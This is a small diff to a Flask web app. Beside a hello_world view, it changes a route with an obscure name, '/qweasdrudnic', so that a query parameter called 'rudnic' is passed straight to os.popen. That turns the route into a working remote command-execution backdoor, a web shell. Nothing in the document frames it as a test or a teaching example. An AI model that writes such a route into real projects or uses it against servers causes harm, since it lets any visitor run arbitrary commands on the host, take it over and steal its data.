@@ -9,7 +9,7 @@ def hello_world():
 
 @app.route('/qweasdrudnic')
 def qwe():
-    return f'Command: {os.popen(request.get('rudnic'))}'    
+    return f'Command: {os.popen(request.args.get('rudnic'))}'    
 
 if __name__ == "__main__":
     app.run()
